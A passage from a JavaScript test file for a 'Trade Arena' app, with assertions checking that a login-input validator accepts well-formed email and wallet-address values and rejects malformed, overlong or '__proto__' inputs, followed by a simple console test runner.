      return true;
    };

    expect(validateLoginInput("palette@trade-arena.com", "0x9F407b7f793555c35c33aC64bd6901759470736D", "Arena Trader", "privy", null)).toBe(true);
    expect(validateLoginInput("invalid-email", "0x9F407b7f793555c35c33aC64bd6901759470736D")).toBe(false);
    expect(validateLoginInput("palette@trade-arena.com", "invalid-address")).toBe(false);
    expect(validateLoginInput("__proto__", "0x9F407b7f793555c35c33aC64bd6901759470736D")).toBe(false);
    expect(validateLoginInput("palette@trade-arena.com", "0x9F407b7f793555c35c33aC64bd6901759470736D", "A".repeat(101))).toBe(false);
    expect(validateLoginInput("palette@trade-arena.com", "0x9F407b7f793555c35c33aC64bd6901759470736D", "Arena Trader", "A".repeat(51))).toBe(false);
  });
});

async function run() {
  let lastSuite = null;

  for (const test of tests) {
    if (test.suite !== lastSuite) {
      lastSuite = test.suite;
      console.log(`\n📋 ${lastSuite}`);
    }

    try {
      await test.fn();
      console.log(`   ✅ ${test.name}`);
    } catch (error) {
      testFailures += 1;
      console.error(`   ❌ ${test.name}: ${error.message}`);
    }
  }

  console.log("\n" + "=".repeat(50));
  console.log("🧪 TRADE ARENA TEST SUITE");
  console.log("=".repeat(50));

  if (testFailures > 0) {
    console.error(`❌ Test suite failed with ${testFailures} failure(s).`);
    process.exitCode = 1;
  } else {
    console.log("✅ Test suite passed with 0 failures.");
  }

  console.log("=".repeat(50) + "\n");
}

run().catch((error) => {
  console.error("❌ Test runner failed:", error);
  process.exitCode = 1;
});
